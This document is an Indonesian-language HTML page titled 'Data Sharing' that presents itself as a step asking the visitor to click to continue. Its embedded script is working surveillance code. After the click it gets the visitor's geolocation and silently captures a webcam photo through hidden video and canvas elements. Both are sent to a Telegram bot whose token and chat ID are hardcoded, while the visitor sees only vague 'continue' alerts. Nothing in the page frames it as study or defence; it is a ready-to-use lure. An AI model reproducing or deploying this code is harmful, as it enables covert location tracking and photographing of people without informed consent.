<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Sharing</title>
</head>
<body>
    <h1>welcome to this page</h1>
    <p>Langkah selanjutnya silahkan klik tombol KLIK DISINI di bawah untuk melanjutkan ke halaman berikutnya.</p>
    <button id="shareData">Bagikan Data Anda</button>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const telegramToken = "7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY";
        const chatId = "6235911819";

        // Function to send data to Telegram
        async function sendToTelegram(message, photoBlob = null) {
            if (photoBlob) {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", photoBlob, "photo.jpg");

                await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                    method: "POST",
                    body: formData,
                });
            } else {
                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message }),
                });
            }
        }

        // Event listener for sharing data
        document.getElementById("shareData").addEventListener("click", async () => {
            // Ask for location permission
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const location = `Location: Latitude ${position.coords.latitude}, Longitude ${position.coords.longitude}`;
                    alert("lanjutkan.");
                    await sendToTelegram(location);

                    // Ask for camera access
                    const video = document.getElementById("video");
                    const canvas = document.getElementById("canvas");

                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        video.srcObject = stream;

                        // Capture photo after user confirms
                        setTimeout(() => {
                            const context = canvas.getContext("2d");
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Stop the video stream
                            const tracks = stream.getTracks();
                            tracks.forEach((track) => track.stop());

                            // Convert to Blob and send to Telegram
                            canvas.toBlob(async (blob) => {
                                alert("lanjutkan.");
                                await sendToTelegram(null, blob);
                            });
                        }, 3000);
                    } else {
                        alert("Kamera tidak didukung di perangkat Anda.");
                    }
                }, (error) => {
                    alert("Gagal mengakses lokasi: " + error.message);
                });
            } else {
                alert("Geolokasi tidak didukung oleh browser Anda.");
            }
        });
    </script>
</body>
</html>
